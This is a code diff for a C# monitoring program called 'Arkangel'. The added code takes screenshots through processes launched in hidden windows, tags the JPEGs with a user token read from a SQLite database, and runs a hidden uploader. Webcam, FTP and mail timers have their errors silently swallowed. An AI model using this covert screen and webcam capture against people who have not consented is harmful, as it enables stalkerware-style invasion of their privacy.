@@ -3,16 +3,21 @@ using Microsoft.Win32;
 using System;
 using System.Collections;
 using System.Collections.Generic;
+using System.Collections.ObjectModel;
 using System.Data.SQLite;
 using System.Diagnostics;
 using System.DirectoryServices;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Net;
 using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
+using System.Threading;
 using System.Timers;
 using System.Windows;
+using System.Windows.Media.Imaging;
 
 namespace Arkangel
 {
@@ -67,6 +72,46 @@ namespace Arkangel
             {
                 return "Error";
             }
+        }
+       public static string Gettoken()
+        {
+            string token="";
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+
+                   
+                    SQLiteCommand sqlCom = new SQLiteCommand(@"SELECT token from current_user", connect);
+                    SQLiteDataReader rr = sqlCom.ExecuteReader();
+                    while (rr.Read())
+                    {
+                       token= rr["token"].ToString();
+                    }
+                }
+            }
+            return token ;
+        }
+        public static string GetMail()
+        {
+            string mail = "";
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+
+                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT username from Users where id = (select id from current_user)", connect);
+                    SQLiteDataReader r = sqlComm.ExecuteReader();
+                    while (r.Read())
+                    {
+                        mail = r["username"].ToString();
+                    }
+                }
+                connect.Close();
+            }
+            return mail;
         }
         public static bool IsUserAdministrator()
         {
@@ -140,12 +185,17 @@ namespace Arkangel
         //Timer for FTP
         public static void SetTimerFTP(int _time)
         {
-            // Create a timer with a two second interval.
-            MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
-            // Hook up the Elapsed event for the timer. 
-            MainWindow.aTimer_scrshot.Elapsed += OnTimedEventFTP;
-            MainWindow.aTimer_scrshot.AutoReset = true;
-            MainWindow.aTimer_scrshot.Enabled = true;
+            try
+            {
+                // Create a timer with a two second interval.
+                MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
+                // Hook up the Elapsed event for the timer. 
+                MainWindow.aTimer_scrshot.Elapsed += OnTimedEventFTP;
+                MainWindow.aTimer_scrshot.AutoReset = true;
+                MainWindow.aTimer_scrshot.Enabled = true;
+            }
+            catch { }
+           
         }
         public static void OnTimedEventFTP(Object source, ElapsedEventArgs e)
         {
@@ -170,6 +220,25 @@ namespace Arkangel
             MainWindow.aTimer_scrshot.AutoReset = true;
             MainWindow.aTimer_scrshot.Enabled = true;
         }
+        public static string GetpathScrShot ()
+        {
+            string path="";
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
+                    SQLiteDataReader data = sqlComm.ExecuteReader();
+                    while (data.Read())
+                    {
+                        path = data["screenshotLog"].ToString();
+                    }
+                }
+                connect.Close();
+            }
+            return path;
+        }
         public static void OnTimedEventScreenShot(Object source, ElapsedEventArgs e)
         {
             try
@@ -179,8 +248,35 @@ namespace Arkangel
                 start.FileName = "screenshot.exe";
                 start.WindowStyle = ProcessWindowStyle.Hidden;
                 Process.Start(start);
+                
+                
+                DirectoryInfo d = new DirectoryInfo(GetpathScrShot());//Assuming Test is your Folder
+                FileInfo[] Files = d.GetFiles("*.jpeg"); //Getting Text files
+                foreach (FileInfo file in Files)
+                {
+                    List<string> s = new List<string>();
+                    s.Add(Gettoken());
+                    ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s); ;
+                    var jpeg = new JpegMetadataAdapter(GetpathScrShot()+"\\"+file.Name);
+                    //jpeg.Metadata.Comment = token;
+                    jpeg.Metadata.Title = "A title";
+                    jpeg.Metadata.Author = autho;
+                    jpeg.Save();
+                    
+                }
+
             }
             catch { }
+            try
+            {
+                ProcessStartInfo startupload = new ProcessStartInfo();
+                startupload.WorkingDirectory = @"..\..\module\";
+                startupload.FileName = "upScreenshot.exe";
+                startupload.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(startupload);
+            }
+            catch { }
+           
         }
         public static void syncUp()
         {
@@ -229,12 +325,17 @@ namespace Arkangel
         // Timer for Webcam
         public static void SetTimerWebcam(int _time)
         {
-            // Create a timer with a two second interval.
-            MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
-            // Hook up the Elapsed event for the timer. 
-            MainWindow.aTimer_webcam.Elapsed += OnTimedEventWebcam;
-            MainWindow.aTimer_webcam.AutoReset = true;
-            MainWindow.aTimer_webcam.Enabled = true;
+            try
+            {
+                // Create a timer with a two second interval.
+                MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
+                // Hook up the Elapsed event for the timer. 
+                MainWindow.aTimer_webcam.Elapsed += OnTimedEventWebcam;
+                MainWindow.aTimer_webcam.AutoReset = true;
+                MainWindow.aTimer_webcam.Enabled = true;
+            }
+            catch { }
+          
         }
         public static void OnTimedEventWebcam(Object source, ElapsedEventArgs e)
         {
@@ -252,12 +353,17 @@ namespace Arkangel
         // Timer for Send mail
         public static void SetTimerSendMail(int _time)
         {
+            try
+            {
+                MainWindow.aTimer_sendMail = new System.Timers.Timer(_time);
+                // Hook up the Elapsed event for the timer. 
+                MainWindow.aTimer_sendMail.Elapsed += OnTimedEventSendMail;
+                MainWindow.aTimer_sendMail.AutoReset = true;
+                MainWindow.aTimer_sendMail.Enabled = true;
+            }
+            catch { }
             // Create a timer with a two second interval.
-            MainWindow.aTimer_sendMail = new System.Timers.Timer(_time);
-            // Hook up the Elapsed event for the timer. 
-            MainWindow.aTimer_sendMail.Elapsed += OnTimedEventSendMail;
-            MainWindow.aTimer_sendMail.AutoReset = true;
-            MainWindow.aTimer_sendMail.Enabled = true;
+           
         }
         public static void OnTimedEventSendMail(Object source, ElapsedEventArgs e)
         {
@@ -311,13 +417,13 @@ namespace Arkangel
                     SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
                     while (data.Read())
                     {
-                        if (data["enable"].ToString() == "2")
+                        if (data["enable"].ToString() == "2") //Monitor current user
                         {
                             if (data["current_user"].ToString() != Environment.UserName)
                                 Environment.Exit(Environment.ExitCode);
                         }
 
-                        if (data["enable"].ToString() == "3")
+                        if (data["enable"].ToString() == "3") //Monitor following user
                         {
                             SQLiteCommand sqlConn = new SQLiteCommand(@"SELECT * FROM user_list,current_user WHERE user_list.id = current_user.id", connect);
                             SQLiteDataReader list = sqlConn.ExecuteReader();
@@ -410,6 +516,37 @@ namespace Arkangel
             Console.WriteLine("hash value: " + hashValue);
             Console.WriteLine("hash expected : " + expectedHashString);
             return (hashValue == expectedHashString);
+        }
+        public static Image SetImageComment(Image image, string comment)
+        {
+            using (var memStream = new MemoryStream())
+            {
+                image.Save(memStream, ImageFormat.Jpeg);
+                memStream.Position = 0;
+                var decoder = new JpegBitmapDecoder(memStream, BitmapCreateOptions.PreservePixelFormat, BitmapCacheOption.OnLoad);
+                BitmapMetadata metadata;
+                if (decoder.Metadata == null)
+                {
+                    metadata = new BitmapMetadata("jpg");
+                }
+                else
+                {
+                    metadata = decoder.Metadata;
+                }
+
+                metadata.Comment = comment;
+
+                var bitmapFrame = decoder.Frames[0];
+                BitmapEncoder encoder = new JpegBitmapEncoder();
+                encoder.Frames.Add(BitmapFrame.Create(bitmapFrame, bitmapFrame.Thumbnail, metadata, bitmapFrame.ColorContexts));
+
+                var imageStream = new MemoryStream();
+                encoder.Save(imageStream);
+                imageStream.Position = 0;
+                image.Dispose();
+                image = null;
+                return Image.FromStream(imageStream);
+            }
         }
     }
 }
